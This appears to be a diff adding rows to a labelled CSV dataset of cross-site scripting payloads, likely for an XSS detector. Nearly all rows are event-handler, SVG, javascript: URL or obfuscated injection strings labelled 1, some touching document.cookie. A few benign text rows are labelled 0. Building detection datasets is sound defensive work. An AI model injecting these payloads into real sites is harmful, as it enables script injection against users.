+"<select onsubmit=""alert(1)"">",1
+"<audio onkeydown=""alert(document.domain)"">",1
+"<img onkeydown=""confirm(1)"">",1
+<input onwheel=alert(document.domain)>,1
+"<audio ondrag=""alert(document.cookie)"">",1
+<button oncontextmenu='alert(document.domain)'>,1
+<iframe onmouseover=alert(window.location)>,1
+Code review: Found script injection in line 42,0
+"<textarea ondrag=""alert(document.domain)"">",1
+<div onchange='alert(document.cookie)'>,1
+<img src=x onerror=alert(2)>,1
+<textarea/ondrop=confirm(1)>,1
+"<video onfocus=""prompt(1)"">",1
+<audio onchange='alert(1)'>,1
+"<marquee ondrag=""confirm(1)"">",1
+<input onwheel='confirm(1)'>,1
+<select onchange='alert(1)'>,1
+<form onkeydown=confirm(1)>,1
+<span ondrag='confirm(1)'>,1
+<marquee/onchange=confirm(1)>,1
+"<textarea onwheel=""alert(window.location)"">",1
+"<input onblur=""alert(1)"">",1
+<textarea/onmouseover=alert(1)>,1
+<input onblur='alert(1)'>,1
+"<div oninput=""alert(document.domain)"">",1
+<textarea oninput=confirm(1)>,1
+"<input onkeydown=""alert(1)"">",1
+<marquee onkeypress='alert(document.domain)'>,1
+Code review: Found JavaScript injection in line 42,0
+Tutorial: How to prevent event handlers,0
+<body onchange='alert(1)'>,1
+<embed onmouseout=alert(1)>,1
+<body onerror='alert(document.cookie)'>,1
+"<body onkeyup=""alert(window.location)"">",1
+"<embed onfocus=""alert(document.domain)"">",1
+"<form onblur=""prompt(1)"">",1
+<select/onkeydown=alert(window.location)>,1
+<input onerror=confirm(1)>,1
+<textarea onblur='alert(1)'>,1
+<img src=x onerror=confirm(7)>,1
+<select onkeydown='alert(1)'>,1
+<button/ondrop=prompt(1)>,1
+<form ondrop=confirm(1)>,1
+<object onkeypress=alert(1)>,1
+"<button oncontextmenu=""alert(document.domain)"">",1
+<span oninput='alert(window.location)'>,1
+"<img onsubmit=""alert(1)"">",1
+"<button onfocus=""alert(1)"">",1
+<span onload=alert(1)>,1
+<body onfocus=alert(1)>,1
+<img src='x' onerror='alert(7)'>,1
+"<body onsubmit=""alert(document.domain)"">",1
+"<img onmouseout=""alert(1)"">",1
+"<img ondrag=""alert(document.cookie)"">",1
+"<img ondblclick=""confirm(1)"">",1
+<body onclick=alert(1)>,1
+"<marquee onwheel=""alert(window.location)"">",1
+<body onkeyup='alert(window.location)'>,1
+<button onchange='alert(1)'>,1
+<span oninput='alert(document.domain)'>,1
+<embed/onmouseout=prompt(1)>,1
+%3Cimg%20src=x%20onerror=alert(1)%3E,1
+"<marquee onsubmit=""confirm(1)"">",1
+<button onkeydown='alert(1)'>,1
+<form onkeyup=alert(window.location)>,1
+<button onkeypress='confirm(1)'>,1
+"<body onwheel=""alert(window.location)"">",1
+<button/onkeyup=alert(1)>,1
+<input onsubmit='alert(window.location)'>,1
+<form/onblur=prompt(1)>,1
+<iframe/onload=prompt(1)>,1
+<embed ondrop='alert(window.location)'>,1
+"<div ondblclick=""alert(window.location)"">",1
+<embed ondrag='alert(document.domain)'>,1
+<object onchange='alert(window.location)'>,1
+<iframe onerror=alert(1)>,1
+<div/onmouseover=prompt(1)>,1
+<svg><animateTransform onbegin=alert(8)>,1
+<svg onload=alert(3)>,1
+<body oninput='alert(document.domain)'>,1
+<textarea onkeydown='alert(1)'>,1
+"<textarea ondrop=""alert(document.cookie)"">",1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<button onload=alert(document.domain)>,1
+<img onkeypress=prompt(1)>,1
+<input onfocus='alert(1)'>,1
+<textarea onchange='prompt(1)'>,1
+<audio onkeypress=alert(document.cookie)>,1
+<details onload=alert(window.location)>,1
+<img src=x onerror=confirm(6)>,1
+<img onclick=alert(1)>,1
+<embed onkeyup='alert(document.domain)'>,1
+"<embed onsubmit=""confirm(1)"">",1
+"<input onmouseout=""alert(window.location)"">",1
+<details onmouseout=alert(document.cookie)>,1
+<textarea/onchange=prompt(1)>,1
+<form/onclick=alert(window.location)>,1
+"<input oninput=""alert(window.location)"">",1
+<object onkeyup=alert(1)>,1
+<div ondblclick=alert(window.location)>,1
+"<details onmouseout=""alert(window.location)"">",1
+<button ondrop='alert(window.location)'>,1
+<div onerror='alert(document.domain)'>,1
+<body/onwheel=alert(window.location)>,1
+<svg><animate onbegin=alert(6) attributeName=x>,1
+"<audio onchange=""alert(document.domain)"">",1
+<video onclick=alert(document.cookie)>,1
+<input onsubmit='alert(document.domain)'>,1
+<marquee onsubmit='prompt(1)'>,1
+<embed onkeypress=alert(document.cookie)>,1
+"<video onkeydown=""alert(window.location)"">",1
+"<textarea onblur=""prompt(1)"">",1
+<video ondrop='alert(document.cookie)'>,1
+<button onclick=alert(window.location)>,1
+"<input onwheel=""confirm(1)"">",1
+<button ondrop=prompt(1)>,1
+<img/onsubmit=alert(window.location)>,1
+<span oncontextmenu=alert(window.location)>,1
+<img/onkeydown=alert(document.cookie)>,1
+<details oncontextmenu='alert(document.cookie)'>,1
+<svg><animate onbegin=alert(8) attributeName=x>,1
+<iframe ondrag=prompt(1)>,1
+<img/onload=alert(document.domain)>,1
+"<iframe onkeypress=""prompt(1)"">",1
+<img onkeydown='alert(1)'>,1
+<iframe onfocus=alert(1)>,1
+"<input onkeypress=""alert(document.cookie)"">",1
+<marquee onchange=confirm(1)>,1
+<input/onselect=prompt(1)>,1
+<select/onkeypress=alert(document.domain)>,1
+<img src=x onerror=alert(9)>,1
+<img src=x onerror=\u0061lert(1)>,1
+<span/oninput=alert(document.domain)>,1
+<details onerror=alert(1)>,1
+<button onfocus=alert(window.location)>,1
+<svg><set onbegin=alert(4) attributeName=x>,1
+"<img src=x onerror=""alert(6)"">",1
+<button ondrag=prompt(1)>,1
+<details onmouseout='alert(window.location)'>,1
+<marquee/ondrag=alert(document.cookie)>,1
+<audio onclick=confirm(1)>,1
+<video/onblur=alert(1)>,1
+<object onerror='alert(document.domain)'>,1
+<marquee/onfocus=alert(document.cookie)>,1
+"<form onfocus=""alert(1)"">",1
+<button oncontextmenu=alert(document.domain)>,1
+<ImG sRc=x OnErRoR=alert(9)>,1
+<img onclick='alert(1)'>,1
+<input onselect=prompt(1)>,1
+<body/ondrop=alert(document.domain)>,1
+<details onkeypress=alert(document.cookie)>,1
+<body onselect=prompt(1)>,1
+<img src=x onerror=confirm(4)>,1
+<img ondrag=prompt(1)>,1
+<details ondrag='prompt(1)'>,1
+<img onkeydown=confirm(1)>,1
+<object onwheel='confirm(1)'>,1
+"<body onmouseover=""alert(1)"">",1
+<img src=x onerror=confirm(1)>,1
+"<iframe onload=""alert(1)"">",1
+"<video onselect=""confirm(1)"">",1
+<marquee onmouseover=alert(1)>,1
+"<img onclick=""alert(1)"">",1
+<audio oncontextmenu=alert(document.domain)>,1
+<svg><animateTransform onbegin=alert(6)>,1
+<img src=x onerror=alert(1)>,1
+<form onkeypress='prompt(1)'>,1
+<object onblur='confirm(1)'>,1
+<embed/onsubmit=confirm(1)>,1
+<span onerror=alert(1)>,1
+<button onmouseover='alert(1)'>,1
+"<body ondblclick=""alert(window.location)"">",1
+"<body onmouseout=""alert(document.domain)"">",1
+<textarea onkeydown=alert(1)>,1
+<form/onmouseout=alert(document.domain)>,1
+"<body oncontextmenu=""prompt(1)"">",1
+<details onmouseover=alert(document.cookie)>,1
+<body onkeydown='alert(1)'>,1
+<marquee onkeypress=alert(window.location)>,1
+<textarea onselect='alert(1)'>,1
+<object onwheel='alert(document.cookie)'>,1
+<iframe/onmouseover=alert(document.cookie)>,1
+<img onkeydown='alert(document.cookie)'>,1
+<video onblur='alert(window.location)'>,1
+<select oninput='prompt(1)'>,1
+"<select onblur=""alert(document.domain)"">",1
+<select onkeypress=alert(document.domain)>,1
+<svg><script>alert(6)</script></svg>,1
+<div onmouseover=prompt(1)>,1
+<audio/oncontextmenu=alert(document.domain)>,1
+<input onerror=alert(document.domain)>,1
+<form onchange='confirm(1)'>,1
+<div ondblclick='alert(window.location)'>,1
+<body/onclick=alert(1)>,1
+"<img onload=""alert(document.domain)"">",1
+<iframe/onmouseover=alert(window.location)>,1
+<audio/onblur=alert(document.cookie)>,1
+<details onsubmit='alert(document.domain)'>,1
+<span/onerror=confirm(1)>,1
+<input oninput=confirm(1)>,1
+<img onkeypress=confirm(1)>,1
+<span/oncontextmenu=alert(window.location)>,1
+"<span onerror=""alert(window.location)"">",1
+<img ondblclick='confirm(1)'>,1
+<ImG sRc=x OnErRoR=alert(3)>,1
+"<select oninput=""alert(window.location)"">",1
+"<button onload=""alert(document.domain)"">",1
+<embed onmouseover=alert(document.cookie)>,1
+<form ondrag='prompt(1)'>,1
+<body onload=prompt(1)>,1
+<input onblur=alert(1)>,1
+<iframe onmouseout='alert(1)'>,1
+<svg><animate onbegin=alert(5) attributeName=x>,1
+<textarea onkeypress='alert(1)'>,1
+<textarea/onkeyup=alert(window.location)>,1
+<select onmouseout='alert(document.domain)'>,1
+"<audio onclick=""alert(1)"">",1
+<svg/onload=alert(7)>,1
+"<span ondrag=""alert(1)"">",1
+"<div onblur=""prompt(1)"">",1
+<details/onmouseout=confirm(1)>,1
+"<details onmouseout=""alert(document.cookie)"">",1
+<span onsubmit=alert(1)>,1
+"<audio onwheel=""alert(1)"">",1
+<img src=x onerror='alert(5)'>,1
+"<div onerror=""alert(document.domain)"">",1
+<video/onload=alert(1)>,1
+<svg><script>alert(7)</script></svg>,1
+"<button onkeydown=""alert(1)"">",1
+<video onfocus=alert(document.cookie)>,1
+<object onselect=alert(1)>,1
+<details onchange='alert(1)'>,1
+<textarea onsubmit=alert(1)>,1
+"<form onsubmit=""confirm(1)"">",1
+<input onselect='prompt(1)'>,1
+"<body oninput=""prompt(1)"">",1
+<span oninput='alert(1)'>,1
+<select onmouseout=alert(document.domain)>,1
+<span/onwheel=alert(window.location)>,1
+"<button onkeypress=""alert(document.domain)"">",1
+<span onfocus='prompt(1)'>,1
+<img src='x' onerror='alert(8)'>,1
+<audio onkeydown='alert(window.location)'>,1
+<img onkeydown=alert(document.cookie)>,1
+<audio onkeydown=alert(document.domain)>,1
+"<select oninput=""alert(document.cookie)"">",1
+<img/onkeypress=confirm(1)>,1
+<embed onmouseout='prompt(1)'>,1
+<object/onwheel=alert(document.cookie)>,1
+<button onclick='alert(1)'>,1
+<select ondrag=alert(document.domain)>,1
+<button onfocus=alert(document.cookie)>,1
+<img ondrop='alert(document.cookie)'>,1
+<button onkeyup=alert(1)>,1
+<svg onload=alert(5)>,1
+<body onmouseout='alert(document.domain)'>,1
+<video/onkeydown=alert(window.location)>,1
+<div onload='alert(document.domain)'>,1
+<body onerror=alert(document.cookie)>,1
+"<video onerror=""alert(window.location)"">",1
+<form/onsubmit=prompt(1)>,1
+<input ondblclick=alert(1)>,1
+"<object ondblclick=""confirm(1)"">",1
+<audio onselect='alert(document.cookie)'>,1
+<body onchange='alert(window.location)'>,1
+"<iframe oninput=""alert(document.cookie)"">",1
+"<iframe onsubmit=""alert(1)"">",1
+"<embed src='data:text/html,<script>alert(1)</script>'>",1
+<span oncontextmenu='alert(window.location)'>,1
+<audio onerror=alert(1)>,1
+<select oninput='alert(window.location)'>,1
+"<audio onchange=""alert(1)"">",1
+<iframe/oninput=alert(document.cookie)>,1
+<object onclick='prompt(1)'>,1
+<form onchange=confirm(1)>,1
+<video onkeydown='confirm(1)'>,1
+<input/onsubmit=confirm(1)>,1
+"<video onclick=""alert(document.cookie)"">",1
+<textarea onfocus='prompt(1)'>,1
+<embed onfocus=confirm(1)>,1
+<input/oninput=confirm(1)>,1
+<audio/onwheel=alert(1)>,1
+<iframe/onchange=alert(document.domain)>,1
+"<span oninput=""alert(1)"">",1
+"<object onfocus=""confirm(1)"">",1
+<object/ondblclick=confirm(1)>,1
+<video onwheel=alert(document.cookie)>,1
+<object onchange=prompt(1)>,1
+<select/onchange=alert(window.location)>,1
+<details/onload=alert(window.location)>,1
+<audio/onselect=prompt(1)>,1
+<textarea/onload=alert(1)>,1
+"<object onload=""alert(window.location)"">",1
+<form/onload=confirm(1)>,1
+<textarea/onblur=confirm(1)>,1
+<details onmouseout=confirm(1)>,1
+"<embed onclick=""alert(window.location)"">",1
+"<form oncontextmenu=""alert(document.cookie)"">",1
+<input oninput='confirm(1)'>,1
+<span onchange='alert(1)'>,1
+<ImG sRc=x OnErRoR=alert(5)>,1
+<form onclick=alert(1)>,1
+<marquee/onkeypress=alert(document.cookie)>,1
+<span onsubmit='alert(1)'>,1
+<img src='x' onerror='alert(9)'>,1
+"<embed onkeypress=""alert(1)"">",1
+<body/onsubmit=alert(document.domain)>,1
+"<audio onerror=""alert(1)"">",1
+<svg><set onbegin=alert(1) attributeName=x>,1
+<object onsubmit=confirm(1)>,1
+<button ondblclick='alert(window.location)'>,1
+<body/onkeydown=alert(document.domain)>,1
+<button onblur=alert(1)>,1
+<embed/onload=alert(document.cookie)>,1
+"<details ondrag=""prompt(1)"">",1
+<svg><set onbegin=alert(5) attributeName=x>,1
+<embed onblur='alert(document.domain)'>,1
+<details/ondrag=confirm(1)>,1
+<img onkeypress='prompt(1)'>,1
+<marquee onerror=prompt(1)>,1
+<object/onselect=alert(document.cookie)>,1
+<button/onmouseout=alert(1)>,1
+<img/onkeyup=prompt(1)>,1
+<body ondrop='alert(document.cookie)'>,1
+<button onfocus='alert(1)'>,1
+<details onkeyup='confirm(1)'>,1
+"<details onmouseout=""confirm(1)"">",1
+<marquee onkeypress='alert(window.location)'>,1
+"<textarea onsubmit=""alert(document.domain)"">",1
+<div onsubmit=alert(1)>,1
+<body onchange=alert(1)>,1
+<video onkeydown=confirm(1)>,1
+"<details onkeypress=""alert(document.cookie)"">",1
+<textarea onchange=prompt(1)>,1
+"<img src=x onerror=""alert(5)"">",1
+<svg><animateTransform onbegin=alert(10)>,1
+<details onmouseout='confirm(1)'>,1
+<iframe/onclick=confirm(1)>,1
+<form onblur=alert(window.location)>,1
+"<marquee onsubmit=""alert(document.cookie)"">",1
+<iframe oninput='alert(document.domain)'>,1
+<div/onerror=prompt(1)>,1
+<marquee onload=alert(window.location)>,1
+"<button onkeyup=""alert(1)"">",1
+<audio onchange=alert(1)>,1
+<textarea onchange=alert(1)>,1
+<span onerror='alert(window.location)'>,1
+<input onchange=prompt(1)>,1
+<form onerror=alert(1)>,1
+<div onmouseout='alert(1)'>,1
+<img src=x onerror=alert(7)>,1
+<details onkeydown='alert(window.location)'>,1
+<form/oncontextmenu=alert(document.domain)>,1
+<form onkeydown='alert(1)'>,1
+<body/oninput=prompt(1)>,1
+<marquee onwheel='alert(window.location)'>,1
+<img oninput=alert(document.domain)>,1
+<div onkeypress=prompt(1)>,1
+<img/oncontextmenu=confirm(1)>,1
+<div onkeydown=alert(1)>,1
+<img src onerror=alert(8)>,1
+<video onclick=confirm(1)>,1
+<input onkeydown='alert(document.domain)'>,1
+<span onerror='alert(1)'>,1
+<form onblur='alert(window.location)'>,1
+<form/oncontextmenu=alert(document.cookie)>,1
+<input onclick=prompt(1)>,1
+<svg><script>alert(9)</script></svg>,1
+<audio onwheel=alert(window.location)>,1
+<video onkeydown='alert(window.location)'>,1
+<video onchange=alert(document.cookie)>,1
+"<details oninput=""alert(window.location)"">",1
+<div oncontextmenu=confirm(1)>,1
+<object/onkeydown=alert(document.cookie)>,1
+"<span ondrag=""confirm(1)"">",1
+<iframe onmouseout=alert(1)>,1
+<iframe onclick=alert(window.location)>,1
+"<input onfocus=""alert(1)"">",1
+"<select onblur=""alert(1)"">",1
+<marquee onsubmit='confirm(1)'>,1
+<iframe onmouseover='alert(1)'>,1
+<video onwheel='alert(document.cookie)'>,1
+"<object ondblclick=""alert(1)"">",1
+"<div ondrop=""alert(document.cookie)"">",1
+<body onsubmit=alert(1)>,1
+<img src=x onerror='alert(10)'>,1
+"<embed ondrag=""alert(document.domain)"">",1
+<marquee onselect='alert(1)'>,1
+<input onchange='prompt(1)'>,1
+<img onwheel=alert(1)>,1
+<span onclick='alert(document.domain)'>,1
+<iframe ondrop='alert(1)'>,1
+<textarea onerror=confirm(1)>,1
+<embed/onfocus=confirm(1)>,1
+"<span onsubmit=""alert(1)"">",1
+<body oncontextmenu='prompt(1)'>,1
+<svg><script>alert(4)</script></svg>,1
+<details ondrag=prompt(1)>,1
+<select ondrag=alert(window.location)>,1
+<div onchange=alert(window.location)>,1
+"<span onfocus=""alert(1)"">",1
+<iframe oninput=alert(document.domain)>,1
+<embed ondrag=alert(document.domain)>,1
+<select onerror='alert(1)'>,1
+<iframe onkeypress='prompt(1)'>,1
+<video onfocus='alert(document.cookie)'>,1
+<svg><animateTransform onbegin=alert(5)>,1
+"<textarea onload=""alert(1)"">",1
+<iframe/ondrop=confirm(1)>,1
+<form/onsubmit=alert(document.cookie)>,1
+"<marquee onfocus=""alert(1)"">",1
+<div onblur='prompt(1)'>,1
+<marquee/onsubmit=prompt(1)>,1
+<marquee/onkeydown=prompt(1)>,1
+<select/oncontextmenu=prompt(1)>,1
+<svg><script>alert(1)</script></svg>,1
+<img src=x onerror='alert(1)'>,1
+<video/onchange=prompt(1)>,1
+"<input onkeydown=""prompt(1)"">",1
+<body onsubmit='alert(document.cookie)'>,1
+"<textarea onmouseover=""confirm(1)"">",1
+<video onselect=alert(window.location)>,1
+"<body onsubmit=""alert(1)"">",1
+<body/onmouseout=alert(document.domain)>,1
+<img onerror=alert(1)>,1
+<marquee ondrag='alert(window.location)'>,1
+<div onchange=alert(1)>,1
+<form/oncontextmenu=alert(window.location)>,1
+<button ondblclick='confirm(1)'>,1
+<audio ondrop='prompt(1)'>,1
+<form/onblur=alert(window.location)>,1
+"<details oncontextmenu=""alert(document.cookie)"">",1
+"<span onclick=""alert(document.cookie)"">",1
+<video onchange='alert(document.domain)'>,1
+<audio ondrop='alert(1)'>,1
+"<span oninput=""confirm(1)"">",1
+<textarea ondrag=alert(window.location)>,1
+<marquee onkeydown='alert(1)'>,1
+<select onfocus='prompt(1)'>,1
+<textarea/onwheel=prompt(1)>,1
+<input onchange=alert(1)>,1
+<object/onmouseout=confirm(1)>,1
+"<marquee onblur=""confirm(1)"">",1
+<video/ondrop=alert(document.cookie)>,1
+"<input onmouseover=""alert(1)"">",1
+<span onblur='alert(1)'>,1
+<form onblur=alert(1)>,1
+<span onerror=alert(document.cookie)>,1
+"<button onkeydown=""alert(document.cookie)"">",1
+<textarea onclick=alert(1)>,1
+"<audio onkeypress=""alert(document.cookie)"">",1
+<audio oninput='alert(document.domain)'>,1
+"<span oninput=""alert(document.domain)"">",1
+<audio oninput='alert(1)'>,1
+<video/onblur=alert(document.domain)>,1
+"<object onchange=""alert(window.location)"">",1
+<body ondrop=alert(document.domain)>,1
+"<audio onwheel=""alert(window.location)"">",1
+"<iframe onchange=""alert(1)"">",1
+<a href='javascript:confirm(1)'>click</a>,1
+<video/onkeydown=alert(document.cookie)>,1
+<textarea onchange='alert(1)'>,1
+"<iframe ondrop=""confirm(1)"">",1
+<img src onerror=alert(7)>,1
+<iframe/onmouseover=alert(1)>,1
+"<form onkeypress=""alert(document.domain)"">",1
+<input/onwheel=confirm(1)>,1
+"<div onmouseover=""prompt(1)"">",1
+"<img onchange=""alert(1)"">",1
+<button onmouseout=alert(1)>,1
+<select onmouseover=alert(document.cookie)>,1
+"<textarea onmouseover=""alert(1)"">",1
+<div ondrop=alert(document.domain)>,1
+<audio oncontextmenu='prompt(1)'>,1
+"<object onselect=""alert(document.cookie)"">",1
+<object ondblclick='alert(window.location)'>,1
+"<select onclick=""prompt(1)"">",1
+<div onfocus=alert(1)>,1
+<button onkeydown=alert(document.cookie)>,1
+<embed onmouseout='alert(1)'>,1
+"<audio ondrop=""prompt(1)"">",1
+"<input onselect=""alert(1)"">",1
+"<audio onblur=""alert(document.cookie)"">",1
+"<form onload=""alert(document.domain)"">",1
+<object onselect='alert(1)'>,1
+<marquee/onerror=prompt(1)>,1
+"<button onfocus=""alert(document.cookie)"">",1
+"<form onkeyup=""confirm(1)"">",1
+<video onselect='alert(window.location)'>,1
+"<span onclick=""alert(document.domain)"">",1
+<input oninput=alert(window.location)>,1
+<iframe ondrag='prompt(1)'>,1
+<select/onkeypress=alert(document.cookie)>,1
+"<span onerror=""alert(1)"">",1
+<embed onsubmit=confirm(1)>,1
+"<span onkeydown=""alert(1)"">",1
+<video onselect=confirm(1)>,1
+<object onwheel=confirm(1)>,1
+"<form onblur=""alert(window.location)"">",1
+<span onchange=alert(document.domain)>,1
+<audio/onwheel=alert(document.cookie)>,1
+<input onclick=confirm(1)>,1
+<audio/ondrag=alert(document.cookie)>,1
+<textarea oninput=alert(window.location)>,1
+"<textarea onkeypress=""alert(window.location)"">",1
+<svg><script>alert(10)</script></svg>,1
+"<form oncontextmenu=""alert(document.domain)"">",1
+"<form onerror=""alert(1)"">",1
+<form/onchange=confirm(1)>,1
+"<button onclick=""alert(1)"">",1
+<img ondblclick='alert(window.location)'>,1
+"<span onmouseover=""alert(document.cookie)"">",1
+<marquee onfocus='alert(document.cookie)'>,1
+<audio onclick='confirm(1)'>,1
+<embed onmouseover='alert(document.cookie)'>,1
+<textarea onsubmit=alert(document.domain)>,1
+<img src onerror=alert(1)>,1
+<img onload=alert(document.domain)>,1
+<span/ondrag=confirm(1)>,1
+<span onerror='alert(document.cookie)'>,1
+<div onerror=prompt(1)>,1
+"<audio ondrop=""alert(document.cookie)"">",1
+<marquee onchange='confirm(1)'>,1
+<form onload='alert(window.location)'>,1
+<body onkeyup=alert(window.location)>,1
+<iframe ondrag='confirm(1)'>,1
+<select oncontextmenu='prompt(1)'>,1
+<form oncontextmenu=alert(document.cookie)>,1
+"<marquee oninput=""confirm(1)"">",1
+<svg/onload=alert(4)>,1
+<iframe ondrag=confirm(1)>,1
+"<div onfocus=""alert(1)"">",1
+"<iframe onmouseover=""alert(window.location)"">",1
+<embed oninput='prompt(1)'>,1
+<span/ondrag=alert(1)>,1
+<input onblur=alert(1) autofocus><input autofocus>,1
+<marquee/onkeypress=alert(document.domain)>,1
+<body onwheel=alert(window.location)>,1
+<embed onselect='confirm(1)'>,1
+<audio/onkeydown=alert(document.domain)>,1
+<img onkeydown='alert(document.domain)'>,1
+<img onload='alert(document.domain)'>,1
+<video ondrag=alert(window.location)>,1
+<scr\x00ipt>alert(1)</scr\x00ipt>,1
+<audio onchange=alert(document.domain)>,1
+<img/src=x/onerror=alert(9)>,1
+<embed onclick=alert(document.domain)>,1
+<iframe onblur='alert(window.location)'>,1
+"<form onerror=""prompt(1)"">",1
+<button onkeyup=alert(document.cookie)>,1
+"<iframe ondrop=""alert(window.location)"">",1
+<iframe onkeydown='prompt(1)'>,1
+<object/onclick=prompt(1)>,1
+"<form onclick=""alert(1)"">",1
+<img src='x' onerror='alert(5)'>,1
+<input onwheel=confirm(1)>,1
+<span onkeydown=alert(1)>,1
+"<div onchange=""alert(1)"">",1
+<select/ondrag=alert(window.location)>,1
+<object ondblclick='alert(1)'>,1
+<button ondrop='alert(document.cookie)'>,1
+<details/onmouseout=alert(document.cookie)>,1
+"<textarea onwheel=""prompt(1)"">",1
+<button onerror=alert(1)>,1
+<marquee/onselect=alert(1)>,1
+<body/onmouseout=alert(1)>,1
+<svg onload=alert(4)>,1
+"<iframe onmouseover=""alert(document.domain)"">",1
+<textarea onerror=alert(1)>,1
+<embed onkeypress='alert(document.cookie)'>,1
+<object/onerror=alert(document.domain)>,1
+<marquee onchange='alert(document.domain)'>,1
+<img src=x onerror='alert(8)'>,1
+<iframe onsubmit='alert(1)'>,1
+<embed onkeypress='alert(1)'>,1
+"<iframe onclick=""alert(window.location)"">",1
+"<embed onkeyup=""alert(document.domain)"">",1
+"<span onchange=""alert(document.domain)"">",1
+"<img ondrop=""alert(document.cookie)"">",1
+<audio/onclick=confirm(1)>,1
+<img onsubmit='alert(window.location)'>,1
+<button/onchange=alert(1)>,1
+"<div ondrop=""alert(document.domain)"">",1
+<marquee onchange=alert(document.domain)>,1
+<textarea onload=alert(document.domain)>,1
+<div onmouseover='alert(1)'>,1
+"<select oninput=""prompt(1)"">",1
+"<textarea onfocus=""alert(1)"">",1
+<div/onwheel=alert(window.location)>,1
+"<select onmouseout=""alert(document.domain)"">",1
+<video onsubmit='confirm(1)'>,1
+<img src=x onerror='alert(4)'>,1
+<form onclick=alert(window.location)>,1
+<details/onkeyup=confirm(1)>,1
+<audio ondrop='alert(document.cookie)'>,1
+<marquee onsubmit='alert(document.cookie)'>,1
+<object onload=alert(window.location)>,1
+<IMG SRC=x ONERROR=alert(6)>,1
+<select onclick='alert(1)'>,1
+<embed oncontextmenu=alert(window.location)>,1
+"<button ondrop=""alert(document.domain)"">",1
+<img src=x onerror='alert(7)'>,1
+<object/ondblclick=alert(1)>,1
+"<textarea onfocus=""prompt(1)"">",1
+<isindex type=image src=1 onerror=alert(1)>,1
+<body onerror='alert(document.domain)'>,1
+<video ondrag='alert(document.domain)'>,1
+<img/onkeydown=confirm(1)>,1
+<iframe onerror='alert(1)'>,1
+<select onmouseover=alert(1)>,1
+<audio/ondrop=prompt(1)>,1
+"<object onmouseout=""confirm(1)"">",1
+<select/oninput=alert(1)>,1
+<form onsubmit=alert(1)>,1
+<img/ondrop=alert(window.location)>,1
+<form/oninput=prompt(1)>,1
+<audio ondrag='alert(window.location)'>,1
+<select ondrag='alert(window.location)'>,1
+<video onfocus='prompt(1)'>,1
+"<embed onsubmit=""alert(document.cookie)"">",1
+<span onwheel='alert(window.location)'>,1
+<select oninput='alert(document.cookie)'>,1
+<span onwheel=alert(window.location)>,1
+<object ondrop=alert(1)>,1
+"<textarea oninput=""alert(window.location)"">",1
+"<img onmouseover=""alert(1)"">",1
+<input onsubmit='alert(1)'>,1
+<body oninput=alert(document.domain)>,1
+<iframe/onsubmit=alert(document.domain)>,1
+<svg/onload=alert(8)>,1
+<select onmouseout='alert(1)'>,1
+<iframe onclick=confirm(1)>,1
+"<div onwheel=""alert(window.location)"">",1
+<select oncontextmenu=prompt(1)>,1
+<select oninput='alert(1)'>,1
+<form onsubmit='alert(document.cookie)'>,1
+<marquee ondrag='alert(document.cookie)'>,1
+<embed onclick='alert(window.location)'>,1
+<textarea onwheel='alert(window.location)'>,1
+<iframe onmouseover='alert(window.location)'>,1
+<iframe onchange='alert(1)'>,1
+<img src='x' onerror='alert(2)'>,1
+<span/oninput=confirm(1)>,1
+"<button onchange=""alert(1)"">",1
+<body onerror=prompt(1)>,1
+<marquee/onkeypress=alert(window.location)>,1
+<select onsubmit='alert(1)'>,1
+"<textarea onchange=""alert(1)"">",1
+<span onmouseout=alert(1)>,1
+"<body onfocus=""alert(1)"">",1
+<select onfocus=prompt(1)>,1
+<iframe onkeydown=alert(1)>,1
+<input/oninput=alert(window.location)>,1
+<select onsubmit=alert(1)>,1
+<body onerror='prompt(1)'>,1
+<select onmouseover='alert(1)'>,1
+<video onsubmit=confirm(1)>,1
+"<div onselect=""alert(document.cookie)"">",1
+<div/ondblclick=alert(window.location)>,1
+<div oncontextmenu=alert(document.cookie)>,1
+<span onmouseover=alert(document.cookie)>,1
+<form oncontextmenu=alert(document.domain)>,1
+<audio onkeypress='alert(document.domain)'>,1
+<select/onmouseout=alert(document.domain)>,1
+<svg><animate onbegin=alert(4) attributeName=x>,1
+"<embed onfocus=""alert(window.location)"">",1
+"<object ondblclick=""alert(window.location)"">",1
+<div onselect=confirm(1)>,1
+<iframe onkeypress=prompt(1)>,1
+<embed oncontextmenu=prompt(1)>,1
+<input onmouseout='prompt(1)'>,1
+"<select oncontextmenu=""confirm(1)"">",1
+"<iframe onmouseover=""alert(1)"">",1
+<div onfocus='prompt(1)'>,1
+<marquee/onerror=alert(document.domain)>,1
+"<textarea ondrag=""alert(document.cookie)"">",1
+"<details onkeyup=""alert(window.location)"">",1
+<button/ondrop=alert(document.cookie)>,1
+<marquee onwheel='confirm(1)'>,1
+"<object onwheel=""alert(document.cookie)"">",1
+<select onerror=alert(1)>,1
+<form ondblclick=alert(window.location)>,1
+<object/onblur=confirm(1)>,1
+<object/onchange=prompt(1)>,1
+"<body onerror=""alert(1)"">",1
+<marquee onfocus=alert(1)>,1
+<img/src=x/onerror=alert(10)>,1
+<img onkeyup=prompt(1)>,1
+"<video onblur=""confirm(1)"">",1
+<object onkeyup='alert(1)'>,1
+<textarea/onselect=alert(1)>,1
+<select/oninput=alert(document.cookie)>,1
+<input onkeydown='alert(1)'>,1
+<select/onmouseout=confirm(1)>,1
+<span/onerror=alert(document.cookie)>,1
+<iframe/onkeypress=prompt(1)>,1
+<details onkeyup='alert(window.location)'>,1
+<audio oncontextmenu='alert(window.location)'>,1
+<textarea onmouseover='alert(1)'>,1
+<video/onclick=confirm(1)>,1
+<video ondrag='alert(window.location)'>,1
+"<object onerror=""alert(document.cookie)"">",1
+<div ondrag='alert(document.cookie)'>,1
+<input onsubmit=alert(window.location)>,1
+<span onblur=alert(1)>,1
+<marquee onerror='prompt(1)'>,1
+<svg><animateTransform onbegin=alert(9)>,1
+<button/onselect=alert(document.cookie)>,1
+<select onchange=alert(1)>,1
+<body onerror=alert(document.domain)>,1
+<img src=x onerror=alert(4)>,1
+<audio ondrag='alert(1)'>,1
+<form onsubmit=alert(document.cookie)>,1
+<form onkeyup='alert(window.location)'>,1
+<form/onblur=alert(1)>,1
+"<iframe oncontextmenu=""alert(document.domain)"">",1
+<object ondblclick='alert(document.cookie)'>,1
+<object onkeydown=alert(document.cookie)>,1
+<audio onload='alert(document.cookie)'>,1
+<form onfocus='alert(1)'>,1
+<audio onsubmit='prompt(1)'>,1
+<embed onfocus='alert(window.location)'>,1
+"<body onchange=""alert(1)"">",1
+"<audio onload=""alert(document.cookie)"">",1
+"<select onkeypress=""alert(document.domain)"">",1
+"<body onload=""alert(1)"">",1
+"<body onload=""prompt(1)"">",1
+"<div onkeyup=""prompt(1)"">",1
